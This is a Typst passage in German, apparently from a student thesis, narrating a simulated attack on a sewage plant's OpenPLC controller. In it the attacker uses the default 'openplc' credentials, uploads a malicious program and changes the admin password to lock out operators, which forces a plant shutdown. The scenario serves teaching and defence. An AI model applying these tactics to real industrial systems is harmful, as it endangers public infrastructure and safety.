Da der Angreifer bereits in der #htl3r.short[lotl]-Phase herausgefunden hat, dass eine OpenPLC-#htl3r.short[sps] im Einsatz ist und die Default-Anmeldedaten -- Benutzername sowie Passwort sind "openplc" -- im Internet auffindbar sind, hat er nun einen uneingeschränkten Admin-Zugriff auf die #htl3r.short[sps] der "Feinfiltration" und kann sie nach Belieben umprogrammieren.

#htl3r.fspace(
  figure(
    image("../assets/openplc/openplc_login.png", width: 70%),
    caption: [OpenPLC-Webdashboard-Login mit den Default-Admin-Credentials]
  )
)

=== SPS-Steuerung wird manipuliert <openplc-manipulation>

Mit dem uneingeschränkten Zugriff auf das OpenPLC-Webdashboard kann der Angreifer sein eigenes Programm hochladen. Bevor dies getan wird, ist es aus Angreifersicht sinnvoll, die Default-Anmeldedaten umzuändern. Wenn im Zuge des Angriffs ein sichtbarer Schaden verursacht wird und das Management der Kläranlage anfängt zu ermitteln, ist ein aufgrund von falschen Anmeldedaten unzugängliches Webdashboard -- als einzige Schnittstelle zur Umprogrammierung -- verheerend.

#htl3r.fspace(
  total-width: 100%,
  figure(
    image("../assets/openplc/openplc_programs.png"),
    caption: [Das bösartige Programm `MALICIOUS_PROGRAM.st` wird hochgeladen]
  )
)

Nach dem erfolgreichen Hochladen des bösartigen Programms ändert der Angreifer auch das Admin-Passwort im Webdashboard unter #htl3r.breadcrumbs(("Users", "OpenPLC User", "Edit User")):

#htl3r.fspace(
  figure(
    image("../assets/openplc/openplc_change_user.png"),
    caption: [Der Admin-Benutzer für das OpenPLC-Webdashboard wird unbrauchbar gemacht]
  )
)

=== Größter anzunehmender Unfall tritt ein

Das Netzwerk wurde aufgrund von fehlender Segmentierung infiltriert, das Lateral Movement des Angreifers wurde wegen fehlender Netzwerküberwachung nicht entdeckt. Eine für die Steuerung des Klärprozesses unabdingbare #htl3r.short[sps] wurde umprogrammiert und unzugänglich gemacht.

Damit durch die manipulierte Steuerung keine weiteren Flutungen zustande kommen, muss die gesamte Anlage gestoppt werden -- der größte anzunehmende Unfall (#htl3r.short[gau]) tritt ein. Damit die Kläranlage wieder klären kann, muss die #htl3r.short[sps] für die Feinfiltration zurückgesetzt werden und das gesamte Netzwerk gesäubert werden, ob durch Virenscans oder sicherheitshalber einem Ersetzen der Geräte.
